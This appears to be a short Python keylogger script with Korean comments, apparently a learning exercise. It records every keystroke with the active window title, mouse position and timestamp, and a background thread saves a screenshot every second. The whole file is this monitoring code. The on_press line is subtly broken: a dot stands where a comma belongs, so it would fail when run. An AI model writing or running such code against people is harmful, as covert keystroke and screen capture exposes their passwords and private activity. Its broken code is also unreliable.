from pynput import keyboard # 키보드 로깅용 모듈
from datetime import datetime # 날짜 시간 함수
import threading # 쓰레드 모듈
import pyautogui # 키보드 마우스 캐므로 제어 모듈
import time # 슬립 함수 위한 모듈
import pygetwindow

def getMouse():
    while True:
        # 마우스 좌표 출력
        print(pyautogui.position())
        # 화면을 캡쳐하여 날짜이름으로 캡쳐 파일 생성
        pyautogui.screenshot(str(datetime.now()).replace(":","_") + ".png")
        time.sleep(1)

def on_press(key):
    # pygetwindow.getActiveWindow().title 포그라운드 프로세스 탐지, 키 눌렀을 때
    # 적용 및 반응하는 프로세스 탐지
    print(pygetwindow.getActiveWindow().title, pyautogui.position(). datetime.now(), key)

# getMouse 함수를 새로운 쓰레드로 생성하여 시작
mouse_thread = threading.Thread(target = getMouse, args=())
mouse_thread.start()

# on press 키보드를 쳤을 때 키로깅
with keyboard.Listener(on_press = on_press, on_release = None) as listener:
    listener.join()